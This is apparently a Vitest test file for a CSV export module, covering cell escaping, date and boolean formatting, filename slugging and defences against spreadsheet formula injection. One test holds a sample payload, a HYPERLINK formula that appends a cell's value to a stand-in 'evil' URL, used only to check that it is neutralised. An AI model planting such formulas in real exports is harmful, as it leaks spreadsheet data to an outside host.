import { describe, expect, it } from "vitest"

import { csvCell, csvFilename, toCsv, type CsvColumn } from "./csv"

describe("csvCell escaping", () => {
  it("leaves an ordinary value alone", () => {
    expect(csvCell("Acme")).toBe("Acme")
  })

  it("quotes a value containing a comma", () => {
    // Without this, one client becomes two columns.
    expect(csvCell("Smith, Jones & Co")).toBe('"Smith, Jones & Co"')
  })

  it("doubles inner quotes", () => {
    expect(csvCell('He said "no"')).toBe('"He said ""no"""')
  })

  it("quotes a value containing a newline", () => {
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"')
    expect(csvCell("line one\r\nline two")).toBe('"line one\r\nline two"')
  })

  it("renders null and undefined as empty, not as the words", () => {
    expect(csvCell(null)).toBe("")
    expect(csvCell(undefined)).toBe("")
  })

  it("writes numbers raw so a spreadsheet can use them", () => {
    expect(csvCell(1234.5)).toBe("1234.5")
    expect(csvCell(0)).toBe("0")
  })

  it("writes a non-finite number as empty rather than NaN", () => {
    expect(csvCell(NaN)).toBe("")
    expect(csvCell(Infinity)).toBe("")
  })

  it("writes dates as ISO, which is unambiguous", () => {
    expect(csvCell(new Date("2026-04-03T12:00:00Z"))).toBe("2026-04-03")
  })

  it("writes booleans as Yes and No", () => {
    expect(csvCell(true)).toBe("Yes")
    expect(csvCell(false)).toBe("No")
  })
})

describe("csvCell formula injection", () => {
  it("neutralises a value that a spreadsheet would execute", () => {
    const attack = '=HYPERLINK("http://evil/"&A1,"click")'
    const out = csvCell(attack)

    // The dangerous character must not be the first thing the reader sees.
    expect(out.startsWith('"=')).toBe(false)
    expect(out).toContain("HYPERLINK")
  })

  it("neutralises every prefix a spreadsheet treats as a formula", () => {
    for (const prefix of ["=", "+", "@"]) {
      const out = csvCell(`${prefix}cmd`)
      expect(out.startsWith(`"${prefix}`)).toBe(false)
      expect(out).toContain("cmd")
    }
  })

  it("neutralises a leading tab or carriage return, which also trigger it", () => {
    expect(csvCell("\t=1+1")).toContain("=1+1")
    expect(csvCell("\r=1+1")).toContain("=1+1")
  })

  it("quotes a neutralised value so the guard survives the round trip", () => {
    // The leading tab must not be stripped by a parser that splits on commas.
    expect(csvCell("=1+1").startsWith('"')).toBe(true)
  })

  it("leaves a negative number alone", () => {
    // -500 is a figure, not an attack. Mangling every negative number in a
    // financial export would be worse than the problem.
    expect(csvCell(-500)).toBe("-500")
    expect(csvCell("-500")).toBe("-500")
    expect(csvCell("-1234.56")).toBe("-1234.56")
  })

  it("still guards a string that only looks like a negative number", () => {
    const out = csvCell("-1+1")
    expect(out.startsWith('"-1+1')).toBe(false)
  })
})

describe("toCsv", () => {
  type Row = { name: string; amount: number; paid: boolean }

  const columns: CsvColumn<Row>[] = [
    { header: "Name", value: (r) => r.name },
    { header: "Amount", value: (r) => r.amount },
    { header: "Paid", value: (r) => r.paid },
  ]

  it("writes a header row and one line per record", () => {
    const csv = toCsv(columns, [
      { name: "Acme", amount: 1000, paid: true },
      { name: "Globex", amount: 250.5, paid: false },
    ])

    expect(csv).toBe("Name,Amount,Paid\r\nAcme,1000,Yes\r\nGlobex,250.5,No")
  })

  it("writes just the header when there are no rows", () => {
    // An empty export is a valid answer; a zero-byte file is not.
    expect(toCsv(columns, [])).toBe("Name,Amount,Paid")
  })

  it("uses CRLF, which is what the specification and Excel expect", () => {
    const csv = toCsv(columns, [{ name: "Acme", amount: 1, paid: true }])
    expect(csv.includes("\r\n")).toBe(true)
  })

  it("escapes values in the body without disturbing the header", () => {
    const csv = toCsv(columns, [{ name: 'Smith, "Jones"', amount: 1, paid: true }])
    expect(csv).toContain('"Smith, ""Jones"""')
    expect(csv.startsWith("Name,Amount,Paid")).toBe(true)
  })
})

describe("csvFilename", () => {
  it("slugs the name and stamps the day", () => {
    expect(csvFilename("Expenses report", new Date("2026-10-11T00:00:00Z"))).toBe(
      "expenses-report-2026-10-11.csv"
    )
  })

  it("collapses punctuation rather than emitting it into a filename", () => {
    expect(csvFilename("AMC & Renewals", new Date("2026-01-02T00:00:00Z"))).toBe(
      "amc-renewals-2026-01-02.csv"
    )
  })

  it("falls back rather than producing a nameless file", () => {
    expect(csvFilename("!!!", new Date("2026-01-02T00:00:00Z"))).toBe("report-2026-01-02.csv")
  })
})
